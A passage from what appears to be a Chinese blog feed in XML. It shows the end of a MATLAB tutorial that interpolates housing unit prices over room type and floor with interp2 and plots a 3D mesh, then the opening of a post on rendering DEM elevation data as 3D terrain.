-76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"/><path id="MJX-5-TEX-N-32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"/><path id="MJX-5-TEX-N-29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"/><path id="MJX-5-TEX-N-2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"/><path id="MJX-5-TEX-N-31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"/><path id="MJX-5-TEX-N-30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"/><path id="MJX-5-TEX-N-2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z"/><path id="MJX-5-TEX-N-35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z"/><path id="MJX-5-TEX-N-2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"/><path id="MJX-5-TEX-I-1D453" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"/><path id="MJX-5-TEX-I-1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z"/></defs><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="TeXAtom" data-mjx-texclass="ORD"><g data-mml-node="mrow"><g data-mml-node="mo"><use xlink:href="#MJX-5-TEX-S4-7B"/></g><g data-mml-node="mtable" transform="translate(806, 0)"><g data-mml-node="mtr" transform="translate(0, 810.6)"><g data-mml-node="mtd"><g data-mml-node="mi"><use xlink:href="#MJX-5-TEX-I-1D43F"/></g><g data-mml-node="mi" transform="translate(681, 0)"><use xlink:href="#MJX-5-TEX-I-1D452"/></g><g data-mml-node="msub" transform="translate(1147, 0)"><g data-mml-node="mi"><use xlink:href="#MJX-5-TEX-I-1D45B"/></g><g data-mml-node="TeXAtom" transform="translate(600, -150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><use xlink:href="#MJX-5-TEX-I-1D45F"/></g><g data-mml-node="mi" transform="translate(451, 0)"><use xlink:href="#MJX-5-TEX-I-1D45C"/></g><g data-mml-node="mi" transform="translate(936, 0)"><use xlink:href="#MJX-5-TEX-I-1D45C"/></g><g data-mml-node="mi" transform="translate(1421, 0)"><use xlink:href="#MJX-5-TEX-I-1D45A"/></g><g data-mml-node="mi" transform="translate(2299, 0)"><use xlink:href="#MJX-5-TEX-N-5F"/></g><g data-mml-node="mi" transform="translate(2799, 0)"><use xlink:href="#MJX-5-TEX-I-1D456"/></g><g data-mml-node="mi" transform="translate(3144, 0)"><use xlink:href="#MJX-5-TEX-I-1D461"/></g><g data-mml-node="mi" transform="translate(3505, 0)"><use xlink:href="#MJX-5-TEX-I-1D45D"/></g></g></g><g data-mml-node="mo" transform="translate(4908.9, 0)"><use xlink:href="#MJX-5-TEX-N-3D"/></g><g data-mml-node="mfrac" transform="translate(5964.6, 0)"><g data-mml-node="mrow" transform="translate(220, 516.8) scale(0.707)"><g data-mml-node="mi"><use xlink:href="#MJX-5-TEX-I-1D460"/></g><g data-mml-node="mi" transform="translate(469, 0)"><use xlink:href="#MJX-5-TEX-I-1D456"/></g><g data-mml-node="mi" transform="translate(814, 0)"><use xlink:href="#MJX-5-TEX-I-1D467"/></g><g data-mml-node="mi" transform="translate(1279, 0)"><use xlink:href="#MJX-5-TEX-I-1D452"/></g><g data-mml-node="mo" transform="translate(1745, 0)"><use xlink:href="#MJX-5-TEX-N-28"/></g><g data-mml-node="mi" transform="translate(2134, 0)"><use xlink:href="#MJX-5-TEX-I-1D45F"/></g><g data-mml-node="mi" transform="translate(2585, 0)"><use xlink:href="#MJX-5-TEX-I-1D45C"/></g><g data-mml-node="mi" transform="translate(3070, 0)"><use xlink:href="#MJX-5-TEX-I-1D45C"/></g><g data-mml-node="mi" transform="translate(3555, 0)"><use xlink:href="#MJX-5-TEX-I-1D45A"/></g><g data-mml-node="mi" transform="translate(4433, 0)"><use xlink:href="#MJX-5-TEX-I-1D460"/></g><g data-mml-node="mo" transform="translate(4902, 0)"><use xlink:href="#MJX-5-TEX-N-2C"/></g><g data-mml-node="mn" transform="translate(5180, 0)"><use xlink:href="#MJX-5-TEX-N-32"/></g><g data-mml-node="mo" transform="translate(5680, 0)"><use xlink:href="#MJX-5-TEX-N-29"/></g><g data-mml-node="mo" transform="translate(6069, 0)"><use xlink:href="#MJX-5-TEX-N-2212"/></g><g data-mml-node="mn" transform="translate(6847, 0)"><use xlink:href="#MJX-5-TEX-N-31"/></g></g><g data-mml-node="mn" transform="translate(2188.9, -345) scale(0.707)"><use xlink:href="#MJX-5-TEX-N-30"/><use xlink:href="#MJX-5-TEX-N-2E" transform="translate(500, 0)"/><use xlink:href="#MJX-5-TEX-N-30" transform="translate(778, 0)"/><use xlink:href="#MJX-5-TEX-N-35" transform="translate(1278, 0)"/></g><rect width="5395.1" height="60" x="120" y="220"/></g><g data-mml-node="mo" transform="translate(11822, 0)"><use xlink:href="#MJX-5-TEX-N-2B"/></g><g data-mml-node="mn" transform="translate(12822.2, 0)"><use xlink:href="#MJX-5-TEX-N-31"/></g></g></g><g data-mml-node="mtr" transform="translate(0, -997.1)"><g data-mml-node="mtd" transform="translate(21.2, 0)"><g data-mml-node="mi"><use xlink:href="#MJX-5-TEX-I-1D43F"/></g><g data-mml-node="mi" transform="translate(681, 0)"><use xlink:href="#MJX-5-TEX-I-1D452"/></g><g data-mml-node="msub" transform="translate(1147, 0)"><g data-mml-node="mi"><use xlink:href="#MJX-5-TEX-I-1D45B"/></g><g data-mml-node="TeXAtom" transform="translate(600, -150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><use xlink:href="#MJX-5-TEX-I-1D453"/></g><g data-mml-node="mi" transform="translate(550, 0)"><use xlink:href="#MJX-5-TEX-I-1D459"/></g><g data-mml-node="mi" transform="translate(848, 0)"><use xlink:href="#MJX-5-TEX-I-1D45C"/></g><g data-mml-node="mi" transform="translate(1333, 0)"><use xlink:href="#MJX-5-TEX-I-1D45C"/></g><g data-mml-node="mi" transform="translate(1818, 0)"><use xlink:href="#MJX-5-TEX-I-1D45F"/></g><g data-mml-node="mi" transform="translate(2269, 0)"><use xlink:href="#MJX-5-TEX-N-5F"/></g><g data-mml-node="mi" transform="translate(2769, 0)"><use xlink:href="#MJX-5-TEX-I-1D456"/></g><g data-mml-node="mi" transform="translate(3114, 0)"><use xlink:href="#MJX-5-TEX-I-1D461"/></g><g data-mml-node="mi" transform="translate(3475, 0)"><use xlink:href="#MJX-5-TEX-I-1D45D"/></g></g></g><g data-mml-node="mo" transform="translate(4887.6, 0)"><use xlink:href="#MJX-5-TEX-N-3D"/></g><g data-mml-node="mfrac" transform="translate(5943.4, 0)"><g data-mml-node="mrow" transform="translate(220, 516.8) scale(0.707)"><g data-mml-node="mi"><use xlink:href="#MJX-5-TEX-I-1D460"/></g><g data-mml-node="mi" transform="translate(469, 0)"><use xlink:href="#MJX-5-TEX-I-1D456"/></g><g data-mml-node="mi" transform="translate(814, 0)"><use xlink:href="#MJX-5-TEX-I-1D467"/></g><g data-mml-node="mi" transform="translate(1279, 0)"><use xlink:href="#MJX-5-TEX-I-1D452"/></g><g data-mml-node="mo" transform="translate(1745, 0)"><use xlink:href="#MJX-5-TEX-N-28"/></g><g data-mml-node="mi" transform="translate(2134, 0)"><use xlink:href="#MJX-5-TEX-I-1D453"/></g><g data-mml-node="mi" transform="translate(2684, 0)"><use xlink:href="#MJX-5-TEX-I-1D459"/></g><g data-mml-node="mi" transform="translate(2982, 0)"><use xlink:href="#MJX-5-TEX-I-1D45C"/></g><g data-mml-node="mi" transform="translate(3467, 0)"><use xlink:href="#MJX-5-TEX-I-1D45C"/></g><g data-mml-node="mi" transform="translate(3952, 0)"><use xlink:href="#MJX-5-TEX-I-1D45F"/></g><g data-mml-node="mi" transform="translate(4403, 0)"><use xlink:href="#MJX-5-TEX-I-1D460"/></g><g data-mml-node="mo" transform="translate(4872, 0)"><use xlink:href="#MJX-5-TEX-N-2C"/></g><g data-mml-node="mn" transform="translate(5150, 0)"><use xlink:href="#MJX-5-TEX-N-32"/></g><g data-mml-node="mo" transform="translate(5650, 0)"><use xlink:href="#MJX-5-TEX-N-29"/></g><g data-mml-node="mo" transform="translate(6039, 0)"><use xlink:href="#MJX-5-TEX-N-2212"/></g><g data-mml-node="mn" transform="translate(6817, 0)"><use xlink:href="#MJX-5-TEX-N-31"/></g></g><g data-mml-node="mn" transform="translate(2178.3, -345) scale(0.707)"><use xlink:href="#MJX-5-TEX-N-30"/><use xlink:href="#MJX-5-TEX-N-2E" transform="translate(500, 0)"/><use xlink:href="#MJX-5-TEX-N-30" transform="translate(778, 0)"/><use xlink:href="#MJX-5-TEX-N-35" transform="translate(1278, 0)"/></g><rect width="5373.9" height="60" x="120" y="220"/></g><g data-mml-node="mo" transform="translate(11779.5, 0)"><use xlink:href="#MJX-5-TEX-N-2B"/></g><g data-mml-node="mn" transform="translate(12779.8, 0)"><use xlink:href="#MJX-5-TEX-N-31"/></g></g></g></g><g data-mml-node="mo" transform="translate(14128.2, 0)"/></g></g></g></g></svg></p>
<figure class="highlight matlab"><table><tbody><tr><td class="code"><pre><span class="line">room_itp = <span class="number">1</span>:<span class="number">0.05</span>:<span class="built_in">size</span>(rooms,<span class="number">2</span>);</span><br><span class="line">floor_itp = <span class="number">1</span>:<span class="number">0.05</span>:<span class="built_in">size</span>(floors, <span class="number">2</span>);</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>对户型和楼层重新生成二维网格矩阵，大小为：<svg xmlns="http://www.w3.org/2000/svg" width="36.524ex" height="2.262ex" viewbox="0 -750 16143.8 1000" xmlns:xlink="http://www.w3.org/1999/xlink" aria-hidden="true" style=""><defs><path id="MJX-20-TEX-I-1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"/><path id="MJX-20-TEX-I-1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"/><path id="MJX-20-TEX-I-1D467" d="M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z"/><path id="MJX-20-TEX-I-1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"/><path id="MJX-20-TEX-N-28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"/><path id="MJX-20-TEX-I-1D453" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"/><path id="MJX-20-TEX-I-1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z"/><path id="MJX-20-TEX-I-1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"/><path id="MJX-20-TEX-I-1D45F" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"/><path id="MJX-20-TEX-N-5F" d="M0 -62V-25H499V-62H0Z"/><path id="MJX-20-TEX-I-1D461" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"/><path id="MJX-20-TEX-I-1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"/><path id="MJX-20-TEX-N-2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"/><path id="MJX-20-TEX-N-32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"/><path id="MJX-20-TEX-N-29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"/><path id="MJX-20-TEX-N-D7" d="M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z"/><path id="MJX-20-TEX-I-1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"/></defs><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><use xlink:href="#MJX-20-TEX-I-1D460"/></g><g data-mml-node="mi" transform="translate(469, 0)"><use xlink:href="#MJX-20-TEX-I-1D456"/></g><g data-mml-node="mi" transform="translate(814, 0)"><use xlink:href="#MJX-20-TEX-I-1D467"/></g><g data-mml-node="mi" transform="translate(1279, 0)"><use xlink:href="#MJX-20-TEX-I-1D452"/></g><g data-mml-node="mo" transform="translate(1745, 0)"><use xlink:href="#MJX-20-TEX-N-28"/></g><g data-mml-node="mi" transform="translate(2134, 0)"><use xlink:href="#MJX-20-TEX-I-1D453"/></g><g data-mml-node="mi" transform="translate(2684, 0)"><use xlink:href="#MJX-20-TEX-I-1D459"/></g><g data-mml-node="mi" transform="translate(2982, 0)"><use xlink:href="#MJX-20-TEX-I-1D45C"/></g><g data-mml-node="mi" transform="translate(3467, 0)"><use xlink:href="#MJX-20-TEX-I-1D45C"/></g><g data-mml-node="mi" transform="translate(3952, 0)"><use xlink:href="#MJX-20-TEX-I-1D45F"/></g><g data-mml-node="mi" transform="translate(4403, 0)"><use xlink:href="#MJX-20-TEX-N-5F"/></g><g data-mml-node="mi" transform="translate(4903, 0)"><use xlink:href="#MJX-20-TEX-I-1D456"/></g><g data-mml-node="mi" transform="translate(5248, 0)"><use xlink:href="#MJX-20-TEX-I-1D461"/></g><g data-mml-node="mi" transform="translate(5609, 0)"><use xlink:href="#MJX-20-TEX-I-1D45D"/></g><g data-mml-node="mo" transform="translate(6112, 0)"><use xlink:href="#MJX-20-TEX-N-2C"/></g><g data-mml-node="mn" transform="translate(6556.7, 0)"><use xlink:href="#MJX-20-TEX-N-32"/></g><g data-mml-node="mo" transform="translate(7056.7, 0)"><use xlink:href="#MJX-20-TEX-N-29"/></g><g data-mml-node="mo" transform="translate(7667.9, 0)"><use xlink:href="#MJX-20-TEX-N-D7"/></g><g data-mml-node="mi" transform="translate(8668.1, 0)"><use xlink:href="#MJX-20-TEX-I-1D460"/></g><g data-mml-node="mi" transform="translate(9137.1, 0)"><use xlink:href="#MJX-20-TEX-I-1D456"/></g><g data-mml-node="mi" transform="translate(9482.1, 0)"><use xlink:href="#MJX-20-TEX-I-1D467"/></g><g data-mml-node="mi" transform="translate(9947.1, 0)"><use xlink:href="#MJX-20-TEX-I-1D452"/></g><g data-mml-node="mo" transform="translate(10413.1, 0)"><use xlink:href="#MJX-20-TEX-N-28"/></g><g data-mml-node="mi" transform="translate(10802.1, 0)"><use xlink:href="#MJX-20-TEX-I-1D45F"/></g><g data-mml-node="mi" transform="translate(11253.1, 0)"><use xlink:href="#MJX-20-TEX-I-1D45C"/></g><g data-mml-node="mi" transform="translate(11738.1, 0)"><use xlink:href="#MJX-20-TEX-I-1D45C"/></g><g data-mml-node="mi" transform="translate(12223.1, 0)"><use xlink:href="#MJX-20-TEX-I-1D45A"/></g><g data-mml-node="mi" transform="translate(13101.1, 0)"><use xlink:href="#MJX-20-TEX-N-5F"/></g><g data-mml-node="mi" transform="translate(13601.1, 0)"><use xlink:href="#MJX-20-TEX-I-1D456"/></g><g data-mml-node="mi" transform="translate(13946.1, 0)"><use xlink:href="#MJX-20-TEX-I-1D461"/></g><g data-mml-node="mi" transform="translate(14307.1, 0)"><use xlink:href="#MJX-20-TEX-I-1D45D"/></g><g data-mml-node="mo" transform="translate(14810.1, 0)"><use xlink:href="#MJX-20-TEX-N-2C"/></g><g data-mml-node="mn" transform="translate(15254.8, 0)"><use xlink:href="#MJX-20-TEX-N-32"/></g><g data-mml-node="mo" transform="translate(15754.8, 0)"><use xlink:href="#MJX-20-TEX-N-29"/></g></g></g></svg>。</p>
<figure class="highlight matlab"><table><tbody><tr><td class="code"><pre><span class="line">[room_1, floor_1] = <span class="built_in">meshgrid</span>(room_itp, floor_itp);</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>再利用 MATLAB 中的 <code>interp2</code> 函数，对出售价格进行插值计算。</p>
<blockquote>
<p>其中，插值方式采用 cubic（三次插值）方法。</p>
</blockquote>
<figure class="highlight matlab"><table><tbody><tr><td class="code"><pre><span class="line">prices = interp2(rooms, floors, priceData, room_1, floor_1, <span class="string">'cubic'</span>);</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>再次通过 <code>mesh</code> 函数绘制并渲染三维网格图，效果如下。</p>
<p><img src="/p/7c8c9cc0/三维网格图-插值处理后.jpg"></p>
<figure class="highlight matlab"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">figure</span>;</span><br><span class="line">mesh(room_1, floor_1, prices);</span><br><span class="line"></span><br><span class="line">xlabel(<span class="string">"户型"</span>);</span><br><span class="line">ylabel(<span class="string">"楼层"</span>);</span><br><span class="line">zlabel(<span class="string">"单价"</span>);</span><br><span class="line">grid on;</span><br></pre></td></tr></tbody></table></figure></li>
</ol>
<hr>
<h1 id="完整代码">5. 完整代码</h1>
<figure class="highlight matlab"><table><tbody><tr><td class="code"><pre><span class="line">clc;clear;</span><br><span class="line">file = <span class="string">'./priceData.xlsx'</span>;</span><br><span class="line"></span><br><span class="line">priceData = table2array(<span class="built_in">readtable</span>(file));</span><br><span class="line"></span><br><span class="line">rooms = <span class="number">1</span>:<span class="built_in">size</span>(priceData, <span class="number">2</span>);</span><br><span class="line">floors = <span class="number">1</span>:<span class="built_in">size</span>(priceData, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">% 对户型、楼层做插值</span></span><br><span class="line">room_itp = <span class="number">1</span>:<span class="number">0.05</span>:<span class="built_in">size</span>(rooms,<span class="number">2</span>);</span><br><span class="line">floor_itp = <span class="number">1</span>:<span class="number">0.05</span>:<span class="built_in">size</span>(floors, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">[room_1, floor_1] = <span class="built_in">meshgrid</span>(room_itp, floor_itp);</span><br><span class="line"></span><br><span class="line">prices = interp2(rooms, floors, priceData, room_1, floor_1, <span class="string">'cubic'</span>);</span><br><span class="line"><span class="built_in">figure</span>;</span><br><span class="line">mesh(room_1, floor_1, prices);</span><br><span class="line"></span><br><span class="line">xlabel(<span class="string">"户型"</span>);</span><br><span class="line">ylabel(<span class="string">"楼层"</span>);</span><br><span class="line">zlabel(<span class="string">"单价"</span>);</span><br><span class="line">grid on;</span><br></pre></td></tr></tbody></table></figure>
]]></content>
      <categories>
        <category>MATLAB</category>
      </categories>
      <tags>
        <tag>MATLAB</tag>
        <tag>三维网格</tag>
        <tag>插值处理</tag>
        <tag>interp</tag>
        <tag>mesh</tag>
      </tags>
  </entry>
  <entry>
    <title>【MATLAB】自学记录之读取 DEM 高程数据文件并渲染成三维地形图</title>
    <url>/p/5deb4750.html</url>
    <content><![CDATA[<h1 id="前言">1. 前言</h1>
<p>近日在学习 MATLAB 编程以及地理高程数据处理等相关知识时，希望通过 MATLAB 的绘图等相关函数，读取高程数据文件，最后以可视化的方式展示全球陆地范围内的三维高程数据图。</p>
<hr>
<h1 id="运行环境及数据">2. 运行环境及数据</h1>
<table>
<thead>
<tr class="header">
<th style="text-align: center;">序号</th>
<th style="text-align: center;">配置项</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;"> 1</td>
<td style="text-align: center;">CPU</td>
<td>Intel i5-12490F</td>
</tr>
<tr class="even">
<td style="text-align: center;">2</td>
